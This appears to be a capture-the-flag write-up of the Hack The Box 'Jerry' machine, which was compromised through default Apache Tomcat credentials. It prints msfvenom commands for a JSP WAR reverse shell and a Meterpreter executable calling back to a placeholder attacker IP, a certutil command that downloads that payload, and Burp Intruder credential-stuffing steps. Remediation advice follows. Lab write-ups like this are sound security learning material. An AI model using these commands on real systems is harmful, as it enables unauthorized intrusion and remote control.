# Hack The Box - Jerry

| Property | Value |
|----------|-------|
| **Machine** | Jerry |
| **Platform** | Hack The Box |
| **Difficulty** | Easy |
| **Target IP** | `10.10.10.95` |

---

## Objective

Jerry is an **easy** Windows machine that demonstrates how **default Apache Tomcat credentials** can lead to remote code execution. The objective is to obtain administrative access to the Tomcat Manager, deploy a malicious WAR application, establish a reverse shell, and upgrade it to a Meterpreter session for post-exploitation.

---

## Enumeration

### Nmap Scan

The target was scanned to identify open ports and running services.

<img width="510" height="157" alt="image" src="https://github.com/user-attachments/assets/62313fc0-2219-4b73-b942-e8bbd9d655c4" />


| Port | State | Service | Version |
|------|------|---------|---------|
| 8080 | Open | HTTP | Apache Tomcat/Coyote JSP Engine 1.1 |

### Analysis

The scan identified **Apache Tomcat** running on **port 8080**. Since Tomcat Manager was exposed and presented an authentication page, testing default credentials became the next logical step.

---

## Credential Discovery

The Apache Tomcat documentation contains a list of commonly used default credentials.

<img width="677" height="470" alt="image" src="https://github.com/user-attachments/assets/df8bf394-998d-4f52-87d4-e0ce003654d6" />


These credentials were saved into a file (`tomcat.txt`) for automated authentication testing.

---

## Exploitation

### Credential Stuffing with Burp Suite

Launch Burp Suite and enable the proxy interceptor.

<img width="431" height="220" alt="image" src="https://github.com/user-attachments/assets/f25e042d-ed4b-4d4d-b6d1-172a0f7e499f" />


Select **Manager App** on the Tomcat homepage.

<img width="166" height="73" alt="image" src="https://github.com/user-attachments/assets/a1ebe722-00ab-4aa9-965f-4a26e6251dc6" />


The authentication request is intercepted by Burp Suite.

Enter any username and password to capture the HTTP Basic Authentication request.

<img width="557" height="216" alt="image" src="https://github.com/user-attachments/assets/09043846-cef9-4ee3-b56f-247e8827c1c0" />


---

### Preparing the Payload List

The credential list must be converted into the same format used by the **Authorization** header.

<img width="290" height="192" alt="image" src="https://github.com/user-attachments/assets/cbbdbb8d-c0ef-41f4-a9e1-e1971cabef55" />

into.

<img width="112" height="127" alt="image" src="https://github.com/user-attachments/assets/2a29da4b-c7c4-4bab-bdc9-6f24bb76512d" />


Each username and password combination is encoded using Base64.

```text
echo -n 'tomcat:tomcat' | base64
```

Since HTTP Basic Authentication transmits credentials in Base64 format, every credential pair must be encoded before being supplied to Burp Intruder.

To automate the conversion:

```text
for cred in $(cat tomcat.txt); do echo -n $cred | base64; done
```
<img width="711" height="179" alt="image" src="https://github.com/user-attachments/assets/f8adb1a7-56de-41ce-b235-b36c54393de9" />

---

### Burp Intruder Attack

Configure Burp Intruder.

- Add the **Authorization** parameter as the payload position.
- Use **Sniper** attack type.

<img width="804" height="268" alt="image" src="https://github.com/user-attachments/assets/135ae84a-375d-447c-9884-b1108fadf010" />


Paste the generated Base64 payloads.

<img width="405" height="319" alt="image" src="https://github.com/user-attachments/assets/0e839fa7-000e-4310-8525-e6b6f2c97d4f" />


Disable URL encoding.

<img width="558" height="65" alt="image" src="https://github.com/user-attachments/assets/71165467-ce13-43ae-b37c-a1b67d45b8fe" />


After the attack completes, compare the response lengths.

<img width="447" height="143" alt="image" src="https://github.com/user-attachments/assets/5a78b1b3-5dd6-45e6-a593-4bc8db28dec5" />


One response is significantly larger, indicating successful authentication.

<img width="349" height="179" alt="image" src="https://github.com/user-attachments/assets/fc821020-a150-47ec-9ff9-bcaf692fc512" />


---

### Successful Authentication

A valid set of default Tomcat credentials successfully authenticated to the Tomcat Manager.

<img width="954" height="483" alt="image" src="https://github.com/user-attachments/assets/0f44f8dc-f7ed-4c58-b018-b69b2d729843" />


The Tomcat Manager provides functionality to deploy WAR applications.

<img width="553" height="199" alt="image" src="https://github.com/user-attachments/assets/62bdb70a-7712-4761-9f4e-8ff8bab7ac28" />

---

## Remote Code Execution

### Generate the WAR Payload

Create a malicious WAR reverse shell using **msfvenom**.

```text
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Attacker-IP> LPORT=4444 -f war > shell.war
```

A Netcat listener was started to receive the reverse connection.

```text
nc -nvpl 4444
```

<img width="622" height="111" alt="image" src="https://github.com/user-attachments/assets/1e63066e-1ad4-4807-a992-242f701a708e" />


---

### Deploy the WAR File

Upload the generated WAR file through the Tomcat Manager interface.

<img width="675" height="68" alt="image" src="https://github.com/user-attachments/assets/90847398-df72-4ea2-84c0-41ac8fc4816c" />


Execute the deployed application.

---

### Obtain Reverse Shell

Once the WAR application is executed, the reverse shell connects back to the Netcat listener.

<img width="465" height="173" alt="image" src="https://github.com/user-attachments/assets/84628b46-460f-4258-9c4a-d687a987fe18" />


---

## Post Exploitation

### Upgrade to Meterpreter

To improve stability and enable advanced post-exploitation features, the initial shell was upgraded to a Meterpreter session.

Generate the Meterpreter payload.

```text
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker-IP> LPORT=4444 -f exe > sh.exe
```

Configure the Metasploit multi-handler.

```text
set payload windows/meterpreter/reverse_tcp
```

Configure:

```text
set LHOST <Attacker-IP>
set LPORT 4444
set ExitOnSession false
```

Host the payload using a Python web server.

```text
python3 -m http.server 80
```

<img width="330" height="30" alt="image" src="https://github.com/user-attachments/assets/46d03074-491a-4463-be05-812697186f3e" />

---
<img width="192" height="281" alt="image" src="https://github.com/user-attachments/assets/ab1cc3bb-36a2-4689-bf2a-c34aa32d8448" />


---

### Transfer the Payload

Download the executable using Windows **certutil**.

```text
certutil -urlcache -f http://<Attacker-IP>/sh.exe C:\Users\Administrator\Desktop\flags\sh.exe
```

<img width="622" height="313" alt="image" src="https://github.com/user-attachments/assets/4b4d1cdc-0dd3-4182-a24c-533a1f13195c" />


Execute the payload.

A Meterpreter reverse connection is established.

<img width="622" height="121" alt="image" src="https://github.com/user-attachments/assets/19236d15-0b11-41bc-9653-a84a3d95f92a" />


---

## Meterpreter Advantages

Upgrading to Meterpreter provides several benefits:

- Stable encrypted communication
- File upload and download
- Process migration
- Privilege management
- Screenshot capture
- Improved shell interaction
- Enhanced post-exploitation capabilities

---

## Attack Path Summary

1. Enumerated the target using Nmap.
2. Identified Apache Tomcat Manager on port **8080**.
3. Collected default Tomcat credentials.
4. Performed credential stuffing using Burp Suite.
5. Successfully authenticated to the Tomcat Manager.
6. Generated a malicious WAR payload.
7. Uploaded and deployed the WAR application.
8. Obtained a reverse shell.
9. Generated a Meterpreter payload.
10. Hosted the payload using Python HTTP Server.
11. Downloaded the executable with `certutil`.
12. Executed the payload.
13. Received a Meterpreter session.
14. Retrieved the target flags.

### Attack Chain Workflow

<img width="449" height="626" alt="image" src="https://github.com/user-attachments/assets/a7b2a59b-b2a7-4888-b743-7c97bd03ad61" />


---

## Risk Analysis

### Finding: Default Apache Tomcat Credentials

**Severity:** Critical

**Risk**

Default Tomcat credentials allowed unauthorized administrative access to the Tomcat Manager application.

**Impact**

- Administrative access to Tomcat
- Remote code execution
- Full system compromise
- Deployment of malicious applications
- Persistent attacker access

**Remediation**

- Remove all default credentials.
- Enforce strong administrator passwords.
- Restrict access to the Tomcat Manager using IP allowlists or VPN.
- Disable unnecessary management interfaces.
- Keep Apache Tomcat updated.
- Monitor administrative logins and WAR deployments.
- Restrict execution of LOLBins such as `certutil.exe`.
- Deploy Endpoint Detection and Response (EDR) solutions.

---

## Root Cause

The Apache Tomcat Manager application was exposed to the network and protected by **default credentials**, allowing an attacker to authenticate and deploy arbitrary WAR applications, resulting in remote code execution.

---

## Evidence

- Nmap identified Apache Tomcat running on **port 8080**.
- Successful authentication using default credentials.
- Successful deployment of a malicious WAR application.
- Reverse shell established.
- Meterpreter session successfully obtained.

---

## Key Learning Points

- Default credentials remain a major security risk.
- Burp Suite Intruder can automate credential testing.
- Apache Tomcat Manager allows authenticated WAR deployment.
- WAR applications can provide remote code execution.
- Windows `certutil` is commonly abused as a LOLBin for file transfer.
- Meterpreter provides significantly better post-exploitation capabilities than a standard reverse shell.
- Matching payload and handler configurations is essential for successful exploitation.

---

## Conclusion

The **Jerry** machine demonstrates how **default credentials** can completely compromise an application server. By authenticating to the Apache Tomcat Manager, deploying a malicious WAR application, and upgrading the initial reverse shell to a Meterpreter session, full administrative control of the target was obtained. This machine highlights the importance of changing default credentials, securing administrative interfaces, restricting management access, and maintaining secure server configurations to prevent unauthorized access and remote code execution.
